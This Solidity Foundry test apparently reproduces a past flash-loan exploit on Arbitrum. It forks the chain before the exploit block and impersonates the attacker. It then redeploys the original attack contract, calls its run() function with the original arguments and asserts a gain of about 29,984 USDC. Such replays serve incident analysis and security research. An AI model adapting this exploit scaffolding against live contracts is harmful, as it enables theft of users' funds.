    function setUp() public {
        vm.createSelectFork(ARBITRUM_ARCHIVE, EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        // attacker is BOTH tx.origin and msg.sender for the whole sequence
        vm.startPrank(ATTACKER, ATTACKER);

        uint256 balBefore = USDC.balanceOf(ATTACKER);

        // re-deploy the exact attack contract; its constructor rebuilds the on-chain lookup table
        bytes memory code = _creationCode();
        address exploit;
        assembly {
            exploit := create(0, add(code, 0x20), mload(code))
        }
        require(exploit != address(0), "attack contract deploy failed");

        // exact original calldata; run() is gated to msg.sender == attacker EOA
        (bool ok, ) = exploit.call(
            abi.encodeWithSignature("run(uint256,uint256,uint256)", ARG_FLASHLOAN_ARB, ARG_DIRECTION, ARG_USDC)
        );
        require(ok, "run() reverted");

        vm.stopPrank();

        uint256 gain = USDC.balanceOf(ATTACKER) - balBefore;
        emit log_named_decimal_uint("Attacker net USDC profit", gain, 6);

        // reported / on-chain figure: 29,984.270865 USDC forwarded to the attacker EOA
        assertApproxEqAbs(gain, 29_984_270865, 1e6, "USDC gain diverged from on-chain ~29,984 USDC");
    }
}
